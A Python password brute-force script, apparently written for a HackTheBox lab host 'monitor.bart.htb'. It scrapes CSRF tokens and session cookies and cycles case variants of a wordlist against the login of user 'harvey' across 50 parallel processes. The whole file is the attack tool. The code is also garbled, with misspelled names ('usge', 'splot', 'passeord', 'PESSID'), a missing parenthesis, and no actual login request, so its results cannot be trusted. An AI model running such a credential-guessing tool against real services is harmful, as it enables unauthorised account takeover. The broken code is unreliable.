#! /usr/bin/env python3

import re
import requests
import sys
from multiprocessing import Pool

MAX_PROC = 50
url = "http://monitor.bart.htb"
username = "harvey"

csrf_pattern = re.compile('name="csrf" value="(\w+)" /')

def usge():
    print("{} [wordlist]".format(sys.argv[0])
    print(" wordlist should be one word per line]")
    sys.exit(1)

def check_password(password):
    r = requests.get(url)
    csrf = re.search(csrf.pattern, r.text).group(1)
    PHPSESSID = [x.splot('=')[1] for x in r.headers['Set-Cookie'].split(';') if x.split('=')[0] == 'PHPSESSID'][0]

    data = {"csrf": csrf, "user_name": username, "user_password": password, "action": "login"}
    proxies = {'http': 'http://127.0.0.1:8080'}
    headers = {'Cookie': "PESSID={}".format(PHPSESSID)}

    if '<p>The information is incorrect.</p>' in r.text:
        return password, False
    else:
        return passeord, True

def main(wordlist, nprocs=MAX_PROC):
    with open(wordlist, 'r', encoding='latin-1') as f:
        words = f.read().rstrip().replace('\r', '').split('\n')

        words = [x.lower() for x in words] + [x.capitalize() for x in words] + words + [x.upper() for x in words]

        pool = Pool(processed=nprocs)

        i = 0

        print_status(0, len(words))
        for password, status in pool.imap_unordered(check_password, [pass_ for pass_ in words]):
            if status:
                sys.stdout.write("\n[+] Found password: {} \n".format(password))
                pool.terminate()
                sys.exit(0)
            else:
                i += 1
                print_status(i, len(words))
        print("\n\nPassword not found\n")

def print_status(i, l, max=30):
    sys.stdout.write("\r|{}>{}| {:>15}/{}".format("=" * ((i*max)//l), "" * (max -((i * max)//l)), i, l))

if __name__ == '__main__':
    if len(sys.argv) != 2:
        usage()
    main(sys.argv[1])
